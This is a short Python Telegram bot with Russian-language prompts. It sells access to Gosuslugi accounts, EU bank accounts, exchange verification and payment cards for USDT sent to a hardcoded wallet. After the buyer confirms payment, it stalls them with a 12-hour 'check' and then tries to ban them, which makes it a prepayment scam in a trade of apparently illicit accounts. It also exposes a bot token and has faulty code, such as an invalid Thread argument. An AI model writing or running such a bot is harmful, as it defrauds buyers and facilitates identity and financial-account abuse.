import telebot
import time
import sqlite3
import threading
from datetime import datetime

TOKEN = "8642894333:AAEVcW8lJ6sCm1kN0yn2rrVECdDbQgUYgck"  # ЗАМЕНИТЕ
bot = telebot.TeleBot(TOKEN)

WALLET = "0x44698049ad0be92e567cdfe9c5aa86d70047ff3e"

PRODUCTS = {
    "gosuslugi": {"name": "Госуслуги (доступ)", "price": "150 USDT"},
    "bank": {"name": "Банковский счёт EU", "price": "250 USDT"},
    "exchange": {"name": "Верификация биржи", "price": "200 USDT"},
    "cards": {"name": "Visa/Mastercard", "price": "350 USDT"}
}

conn = sqlite3.connect('db.sqlite', check_same_thread=False)
c = conn.cursor()
c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, step TEXT, product TEXT)')
conn.commit()

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    c.execute("INSERT OR REPLACE INTO users (id, step) VALUES (?, 'menu')", (uid,))
    conn.commit()
    bot.send_message(uid, "ВЫБЕРИТЕ УСЛУГУ:\n/gosuslugi\n/bank\n/exchange\n/cards")

@bot.message_handler(commands=['gosuslugi','bank','exchange','cards'])
def buy(m):
    uid = m.chat.id
    key = m.text.replace('/','')
    p = PRODUCTS[key]
    c.execute("UPDATE users SET step='payment', product=? WHERE id=?", (key, uid))
    conn.commit()
    bot.send_message(uid, f"Оплата: {p['name']}\n{p['price']}\nКошелёк: {WALLET}\nПосле перевода /confirm")

@bot.message_handler(commands=['confirm'])
def confirm(m):
    uid = m.chat.id
    bot.send_message(uid, "Платёж проверяется до 12 часов. Ожидайте.")
    def ban():
        time.sleep(600)
        try:
            bot.ban_chat_member(uid, uid)
        except:
            pass
    threading.Thread(target=ban, start=True)

@bot.message_handler(func=lambda m: True)
def all(m):
    bot.send_message(m.chat.id, "/start - меню")

bot.polling(none_stop=True)
